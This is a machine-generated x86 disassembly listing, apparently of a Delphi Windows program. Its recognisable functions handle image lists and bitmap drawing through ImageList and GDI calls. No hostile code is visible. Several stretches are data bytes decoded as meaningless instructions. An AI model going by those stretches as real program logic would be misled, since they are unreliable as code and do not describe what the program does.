jb r-xdata
add eax 0x74696e55
xor al [ eax ]
add [ eax - 0x1374aa70 ] dl
add esp 0xffffffd8
push ebx
call sub_45984d
mov [ ebp - 0x25 ] dl
mov ebx eax
mov eax rw-data
call sub_44f3b0
cmp [ ebp - 0x25 ] 0x0
jl r-xdata
xor ah [ eax ]
sub al [ eax ]
nop
nop
nop
fadd [ edx ]
add [ eax ] al
add eax [ eax ]
xor [ eax ] al
add [ eax ] al
add [ eax ] al
mov bh 0x0
add [ eax ] al
cmp [ eax ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al dh
and [ eax ] al
add eax [ eax ]
dec esp
add [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
sub [ ebp - 0x8 ] 0xf
xor edx edx
mov eax ebx
call sub_401b68
cmp [ ebp - 0x25 ] 0x0
jle r-xdata
mov [ 0x0 ] edx
xor al [ eax ]
add [ ecx + ebx ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
and [ eax ] al
pop es
push es
push esp
inc esi
outsd
jb r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_459840
pop ebp
retn
xor ch [ esp + ebp * 8 + 0x46 ]
add [ edx + esi * 2 + r--data ] dl
sub_40215c
test al 0x21
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x80040 ] dh
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
sub_402194
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x50 ] 0x22
inc eax
add [ eax - 0x44 ] dl
inc esp
add [ ebx ] dl
inc eax
add ah ch
and al [ eax ]
or al 0x54
dec edi
jb r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
stosd [ edi ]
inc ebx
add al ch
mov dh 0x9d
add al 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0x10909090
and al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x22
inc eax
add [ eax ] cl
add [ eax ] al
add [ ecx + 0x40 ] bl
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x50 ] 0x22
inc eax
add [ ebx + 0x40 ] al
add [ ebx ] dl
inc eax
add ah ch
and al [ eax ]
push es
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_402224
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_402240
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
pop ecx
pop ecx
pop ebp
retn
sub_40225c
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4022b0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_4022ec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43c464
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_402314
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43c2dc
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_402344
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43c264
pop ecx
pop ecx
pop ebp
retn
sub_402364
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_402389
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_402390
retn
sub_40239c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4023c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4023c8
retn
sub_4023d8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc esp
add [ eax - 0x63ffbb3e ] ch
retn 0x44
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24 ] ch
inc eax
add [ eax - 0x18000000 ] al
aas
inc eax
add [ esp + ebp ] bh
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
sub_402414
add al 0xc0
inc esp
add [ eax ] bl
rol [ eax + eax + 0x28 ] 0x4b
inc eax
add [ eax + 0x4b ] dh
inc eax
add [ eax ] dl
inc esp
add [ ecx * 8 + 0x27b00043 ] cl
inc esp
add [ eax - 0x7bffbbdb ] ah
inc edx
inc eax
add [ eax ] dh
push eax
inc eax
add [ esp + ebp + 0x27fc0044 ] al
inc esp
add al ah
daa
inc esp
add [ esp + ebp + 0x24bc0044 ] bl
inc eax
add [ eax + esi ] dh
inc esp
add al cl
das
inc esp
add [ eax ] ch
das
inc esp
add [ eax + 0x2f ] dl
inc esp
add [ eax + 0x2f ] al
inc esp
add [ eax + 0x44 ] ch
inc eax
add [ ebx ] cl
push esp
dec eax
imul ebp [ esi + 0x74 ] 0x69746341
outsd
outsb
js r-xdata
xor [ ebp + 0x600044 ] dl
add bh bh
sbb al 0x4e
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040003 ] al
imul ebp [ esi + 0x74 ] 0x55909090
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
inc eax
add [ edi ] al
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_404ac0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
hlt
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and [ eax + eax * 2 ] ah
add [ eax + eax * 2 + 0x40040 ] dh
or [ ebx + 0x74 ] dl
inc ecx
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4024bc
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_404ac0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40250c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_402531
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_402538
retn
sub_402548
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
and eax 0x25980040
inc eax
add [ eax ] dl
add [ eax ] al
add al cl
movsd [ edi ] [ esi ]
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x1c ] 0x3d
inc eax
add [ ecx ] al
add bh bh
jmp [ ebp + edi + 0x40 ]
sub_4025c4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x4026
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x26 ] cl
inc eax
add [ eax + 0x26 ] dl
inc eax
add [ eax ] ah
add [ eax ] al
hlt
sub_402690
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40e410
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
sub eax 0x1fffffff
je r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov [ ebp - 0x8 ] 0xff000000
jmp r-xdata
sub_4026cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
sub eax 0xff000000
je r-xdata
mov [ ebp - 0x8 ] 0x20000000
jmp r-xdata
sub eax 0xffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0x1fffffff
jmp r-xdata
sub_402708
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442100
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] 0x10
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x10
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40276c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c600
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4035ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
call sub_402b08
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x40 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44215c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
call sub_44c070
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_4027fc
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4028cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x1
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x8000
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x1
jge r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x35 ] 0x1
mov dl 0x2
mov eax [ ebp - 0x4 ]
call sub_403524
mov eax [ ebp - 0x4 ]
mov [ eax + 0x37 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x38 ] 0x1fffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3c ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
mov eax [ ebp - 0x4 ]
call sub_402914
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4028d6
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
sub_402914
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4029bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax [ ebp - 0xc ]
call sub_415a4c
mov eax [ ebp - 0xc ]
call sub_414c24
mov eax [ eax + 0x14 ]
xor edx edx
call sub_40f388
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_43b7c8
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
call sub_414c24
pop edx
call sub_40f808
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4029c3
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4029e4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetIconSize
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x4 ]
call sub_402914
mov esp ebp
pop ebp
retn
sub_402a34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_402b08
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4029e4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
sub_402a74
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_402a98
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40349c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov edx [ eax ]
call [ edx + 0x60 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
call sub_414cc4
cmp al 0x1
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x60 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x60 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_402b08
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x36 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_402a74
push eax
call ImageList_Destroy
sub_402b4c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_402bfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x35 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
push eax
call ImageList_Create
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x1fffffff
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_402c04
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_402dc0
sub_402c08
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_402cba
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_402c9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4028f8
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_402a98
push eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_402a98
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call ImageList_Add
mov [ ebp - 0x10 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_402ca4
mov eax [ ebp - 0x18 ]
call sub_44c070
retn
sub_402cd8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_402a74
push eax
call ImageList_GetImageCount
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_402d0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_402d9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_402cd8
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_402da1
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_402a74
push eax
call ImageList_Remove
sub_402dc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp - 0x8 ]
call sub_402690
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_402e0c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_402a74
push eax
call ImageList_GetBkColor
call sub_4026cc
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_402e4c
push ebp
mov ebp esp
add esp 0xffffffc8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
call sub_402690
push eax
mov eax [ ebp - 0x4 ]
call sub_402e0c
call sub_402690
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40fc38
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_402a74
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
call sub_414c24
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_40f388
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
xor edx edx
xor eax eax
call sub_43b7c8
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
call sub_414c24
pop edx
call sub_40f808
push 0x0
push 0x0
push 0xff000000
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
call sub_414c24
call sub_40fc38
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_402a74
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp - 0x4 ]
add ecx [ eax + 0x28 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_43b7c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
call sub_414c24
call sub_40fc38
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov edx 0x80000014
call sub_40f388
mov eax [ ebp - 0xc ]
call sub_40fc38
mov [ ebp - 0x10 ] eax
push 0xffffff
mov eax [ ebp - 0x10 ]
push eax
call SetTextColor
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov edx 0x80000010
call sub_40f388
mov eax [ ebp - 0xc ]
call sub_40fc38
mov [ ebp - 0x10 ] eax
push 0xffffff
mov eax [ ebp - 0x10 ]
push eax
call SetTextColor
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
mov dl 0x1
